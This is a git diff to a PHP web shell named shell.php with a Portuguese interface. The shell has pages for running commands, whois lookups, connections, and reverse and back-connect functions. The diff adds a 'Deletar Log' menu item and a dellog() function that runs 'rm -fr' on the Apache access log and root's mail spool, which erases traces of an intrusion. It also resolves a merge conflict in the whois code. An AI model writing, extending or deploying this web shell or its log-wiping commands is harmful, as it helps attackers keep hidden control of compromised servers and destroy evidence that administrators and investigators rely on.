@@ -330,6 +330,7 @@ echo "
 			<li><a href='shell.php'>Arquivos</a></li>
 			<li><a href='?pag=comandos'>Comandos</a></li>
 			<li><a href='?pag=whois'>Whois</a></li>
+			<li><a href='?pag=dellog'>Deletar Log</a></li>
 			<li><a href='?pag=conexao'>Conexão</a></li>
 			<li><a href='?pag=lookup'>Lookup</a></li>
 			<li><a href='?pag=info'>Info</a></li>
@@ -442,8 +443,27 @@ else if($page == 'renomear'){
 }
 
 else if($page == 'whois'){
-	whois();
+	echo "
+	<section>
+	<header>Whois</header>
+	<article>
+	";whois();echo"
+	</article>
+	</section>
+	";
 }
+
+else if($page == 'dellog'){
+	echo "
+	<section>
+	<header>Deletar Log</header>
+	<article>
+	";dellog();echo"
+	</article>
+	</section>
+	";
+}
+
 
 else{
 	listar($diretorio);	
@@ -760,7 +780,6 @@ function reverse($host){
 function whois(){
 	echo "
 	<form action='shell.php?pag=whois' method='post'>
-<<<<<<< HEAD
 	Dominio: <input type='text' name='nomedominio'>
 	<input type='submit' name='inciarwhois' value='Ir'>
 	</form>
@@ -773,21 +792,12 @@ function whois(){
 	socket_write($socket, $nomedominio, strlen($nomedominio));
 	$resultado  = socket_read($socket, 1024);
 	echo $resultado;
-=======
-	Dominio: <input type='text' name='domainname'>
-	<input type='submit' name='startwhois' value='Ir'>
-	</form>
-	";
-	$whoisdomain = $_POST['domainname'];
-	$domainname = $whoisdomain."\r\n";
-	$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-	socket_getpeername($socket, $whoisdomain);
-	socket_connect($socket, '200.160.2.3', 43);
-	socket_write($socket, $domainname, strlen($domainname));
-	$result  = socket_read($socket, 1024);
-	echo $result;
->>>>>>> c4f18cd531f1028606633ced03545d2467ff1103
-	socket_close($socket);
+}
+
+function dellog(){
+	system("rm -fr /var/log/apache2/access.log");
+	system("rm -fr /var/mail/root");
+	echo "Log deletado!";
 }
 
 function backconnect()
